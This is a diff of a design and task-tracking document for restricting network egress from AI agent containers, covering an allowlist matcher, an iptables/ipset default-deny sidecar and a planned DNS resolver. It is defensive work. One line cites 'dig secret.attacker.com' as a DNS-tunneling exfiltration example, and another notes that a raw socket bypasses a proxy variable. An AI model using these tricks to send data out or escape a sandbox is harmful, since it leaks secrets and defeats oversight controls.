@@ -33,23 +33,26 @@ tracker as separate issues. None implemented yet.
   middlebox (the `HTTP_PROXY` env-var proxy is not a real control — a raw socket bypasses
   it). Delivered as **one PR, sequential commits A→B→C, each independently green**.
 
-  **Currently on the branch:**
+  **Merged (SHI-90 PR #1301):**
   - [x] Allowlist matcher (`egress-allowlist.ts` + test) — base + `SESSION_EGRESS_ALLOWLIST`
-        + live MCP hosts; suffix matching rejects look-alikes. **Keep** — reused by Tier C.
-  - [x] **Reverted the interim explicit-proxy slice** (superseded by the gateway; it
-        presented a non-enforcing `SESSION_EGRESS_PROXY` flag that looked like protection):
-        deleted `egress-proxy.ts` + test, removed the `buildEnv`
-        `HTTP_PROXY`/`HTTPS_PROXY`/`NO_PROXY` injection in `container-lifecycle.ts` + its
-        test, `setEgressProxy` in `session-container.ts`, the `app-lifecycle.ts` startup,
-        and the `index.ts`/`shutdown-manager.ts` wiring. Trimmed the `SECURITY-MODEL.md` +
-        `shipit-docs/environment.md` egress copy back to "in design". The `CONNECT`-gating
-        logic lives in git history + the design doc for reuse in Tier C's transparent proxy.
+        + live MCP hosts; suffix matching rejects look-alikes. Reused by Tier C.
+  - [x] The interim explicit `HTTP_PROXY` proxy was reverted before merge (non-enforcing;
+        superseded by the netns-sidecar enforcement below).
+
+  **Architecture resolved (egress-control.md):** enforcement is installed **inside the
+  agent's own netns** by privileged orchestrator-launched sidecars
+  (`--network container:<agent> --cap-add NET_ADMIN`) — no separate network / gateway /
+  routing. SHI-31's non-root agent makes the Tier C owner-match exemption unambiguous.
 
   **To build (the actual control):**
-  - [ ] **Tier A** — `internal` per-session network + gateway; iptables default-deny +
-        `ipset` floor (Anthropic `init-firewall.sh` patterns: `gh api meta` CIDR,
-        resolve-and-pin, `example.com`-must-fail self-test). NET_ADMIN lives in the
-        gateway, never the agent container.
+  - **Tier A** — iptables default-deny (`OUTPUT DROP`) + `ipset` allow-set installed in the
+    agent netns by a short-lived sidecar; allow-set = resolved FQDNs + `gh api meta` CIDR
+    (resolve-before-deny ordering), `example.com`-must-fail self-test.
+    - [x] Allow-set logic core (`egress-firewall.ts` + test): `gh api meta` CIDR
+          parse/dedupe, ipset member composition + validation, concrete resolve-host list.
+    - [ ] Sidecar image + installer script (iptables/ipset, resolve-before-deny, self-test)
+          and orchestrator wiring to launch it in the agent netns. *Requires a live Docker
+          host to verify — not unit-testable in the sandbox.*
   - [ ] **Tier B** — controlled DNS resolver at the gateway: answers only allowlisted
         names (closes DNS tunneling — `dig secret.attacker.com`) and drives the ipset with
         the IPs it returns (kills stale-IP breakage). The correction over Anthropic's
